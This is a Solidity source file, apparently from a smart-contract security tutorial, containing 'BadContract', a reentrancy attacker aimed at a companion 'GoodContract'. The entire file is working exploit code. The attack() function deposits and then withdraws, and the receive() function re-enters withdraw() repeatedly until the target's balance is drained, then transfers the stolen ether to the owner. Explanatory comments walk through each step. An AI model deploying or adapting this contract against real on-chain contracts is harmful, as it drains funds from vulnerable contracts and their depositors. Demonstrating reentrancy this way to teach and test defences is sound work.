// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./GoodContract.sol";

contract BadContract{

    address public owner;

    /// @dev    created a contract type variable at state level
    GoodContract public goodContract;

    /// @dev    used constructor to set the good address of the goodContract so that we can
    ///interact with it
    constructor(address _goodContractAddress) {
        owner = msg.sender;
        goodContract = GoodContract(_goodContractAddress);
    }

    /// @dev    receive function that checks if the goodContract has ether and continues to withdraw
    receive() external payable {
        if(address(goodContract).balance > 0) {
            goodContract.withdraw();
        } else {
            payable(owner).transfer(address(this).balance);
        }
    }

    /// @dev    attack function that sends in ether to the good contract and then withdraws back immediately
    function attack() public payable {
        goodContract.deposit{value: msg.value}();
        goodContract.withdraw();
    }

    /// @dev get contract balance
    function getBalance() external view returns (uint bal) {
        bal = address(this).balance;
    }
}